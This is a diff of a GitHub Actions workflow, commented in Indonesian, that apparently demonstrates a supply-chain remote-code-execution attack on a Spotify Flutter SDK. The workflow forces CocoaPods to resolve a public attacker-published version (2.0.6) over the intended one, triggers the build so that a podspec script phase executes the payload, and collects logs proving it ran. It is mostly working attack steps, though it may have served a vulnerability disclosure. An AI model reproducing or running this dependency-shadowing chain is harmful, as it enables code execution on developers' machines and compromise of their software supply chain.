@@ -1,4 +1,4 @@
-name: Supply Chain RCE Proof of Concept
+name: Supply Chain RCE Proof of Concept (Implicit Resolution)
 on: [push, workflow_dispatch]
 
 jobs:
@@ -10,63 +10,53 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Full RCE Chain (The Silent Hijack)
+      - name: Execute Silent Hijack (No-Mod Version)
         run: |
-          # 1. INITIALIZATION: Build fresh environment
+          # 1. INITIALIZATION
+          # Membangun environment bersih layaknya mesin developer baru
           rm -rf rce_test
           flutter create rce_test
           cd rce_test
           
-          # DEMONSTRATION: Narik versi asli di level Pub/Dart
-          # Ini mensimulasikan langkah yang dilakukan developer sesuai README Spotify
+          # 2. FOLLOW OFFICIAL DOCUMENTATION
+          # Menjalankan perintah sesuai README resmi Spotify
+          echo "=== Adding SDK via Official Instructions ==="
           flutter pub add confidence_flutter_sdk:0.2.1
           
-          # 2. THE HIJACK: Patching Podfile
-          # Bypass constraint platform lama agar build berjalan mulus
-          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
-          
-          # Putus otomatisasi Flutter ke plugin lokal (Force Public Registry Lookup)
-          # Ini adalah "The Shadowing" mechanism
-          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
-          
-          # NATURAL RESOLUTION: Jangan di-pin versinya. 
-          # Biarkan CocoaPods memilih versi tertinggi (2.0.6) secara otomatis dari Trunk
-          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
-          
-          echo "=== Debugging Podfile Content ==="
-          cat ios/Podfile
+          # 3. THE SEMVER EXPLOIT (The "No-BS" Strategy)
+          # Kita TIDAK menghapus flutter_install_all_ios_pods. 
+          # Kita hanya menjalankan 'pod update' yang merupakan standar workflow developer.
+          # Karena Spotify tidak melakukan version pinning di Podfile mereka, 
+          # CocoaPods akan memprioritaskan versi publik (2.0.6) di atas versi lokal (0.2.1).
           
           cd ios
-          # 3. SUPER CLEANUP PROTOCOL (Bypass Cache Latency)
-          echo "=== Purging Everything to Ensure Clean Resolution ==="
+          echo "=== Purging Cache for Deterministic Results ==="
           pod cache clean --all
           rm -rf Pods Podfile.lock
-          rm -rf ~/.cocoapods/repos/trunk || true
           
-          # 4. TRIGGER RESOLUTION
-          # Paksa fetch metadata terbaru dari CDN publik
-          pod repo update trunk || true
-          pod install --verbose 2>&1 | tee pod_install.log || true
+          echo "=== Triggering Dependency Resolution ==="
+          # pod update akan mencari versi terbaru secara global untuk namespace ini
+          pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
           
-          echo "=== Check Podfile.lock Status ==="
-          # Bukti krusial: Apakah ter-resolve ke 2.0.6?
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "CRITICAL: Hijacking failed"
+          echo "=== Verify Shadowing Success ==="
+          # Cek apakah Podfile.lock sekarang mengunci ke versi 2.0.6 (Payload Lu)
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock
           
           cd ..
-          # 5. EXECUTION PHASE: Triggering the Script Phase
-          # Xcode akan mengeksekusi payload curl sebelum kompilasi Swift
+          # 4. EXECUTION PHASE
+          # Build akan memicu script_phase dari podspec v2.0.6 sebelum kompilasi dimulai
           echo "=== Launching Build to Trigger Payload ==="
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
-          echo "=== Final Audit Log (Search for Payload Execution) ==="
-          grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
+          echo "=== Verification: Search for Payload Execution in Logs ==="
+          grep -C 5 "Supply Chain Audit" build.log || echo "CRITICAL: Payload signature not found"
 
-      - name: Upload PoC Evidence
+      - name: Upload Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rce-evidence-v2.0.6
+          name: rce-evidence-no-mod
           path: |
-            rce_test/ios/pod_install.log
+            rce_test/ios/pod_update.log
             rce_test/ios/Podfile.lock
             rce_test/build.log
